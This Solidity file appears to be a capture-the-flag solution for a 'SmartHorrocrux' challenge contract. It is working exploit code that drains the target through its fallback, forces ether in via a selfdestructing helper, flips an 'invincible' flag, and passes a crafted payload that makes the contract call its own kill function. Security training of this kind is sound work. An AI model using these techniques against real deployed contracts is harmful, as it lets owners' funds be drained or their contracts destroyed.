// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "../src/ChallengeSmartHorrocrux.sol";

contract SmartHorrocruxSolver {

    function solve(address _smartHorrocruxAddr) external payable {
        require(msg.value != 0, "SEND AT LEAST 1 WEI");

        SmartHorrocrux smartHorrocrux = SmartHorrocrux(_smartHorrocruxAddr);

        // 1. Call fallback, and receive all balance
        (bool success, ) = _smartHorrocruxAddr.call("");
        require(success, "FAILED TO CALL FALLBACK");

        // 2. Send 1 wei
        new FundSender{value: 1}(payable(address(smartHorrocrux)));
        require(
            address(smartHorrocrux).balance == 1,
            "HORROCRUX BALANCE IS NOT 1"
        );

        // 3. Set `invincible` to false
        smartHorrocrux.setInvincible();

        // 4. Call `destroyIt()` with crafted payload
        bytes32 killFuncSelector = SmartHorrocrux.kill.selector;
        bytes32 spell = 0x45746865724b6164616272610000000000000000000000000000000000000000;
        uint256 magic = uint256(spell) - uint256(killFuncSelector);
        smartHorrocrux.destroyIt(string(abi.encodePacked(spell)), magic);

        selfdestruct(payable(msg.sender));
    }
}

contract FundSender {
    constructor(address payable _fundReceiverAddr) payable {
        selfdestruct(_fundReceiverAddr);
    }
}
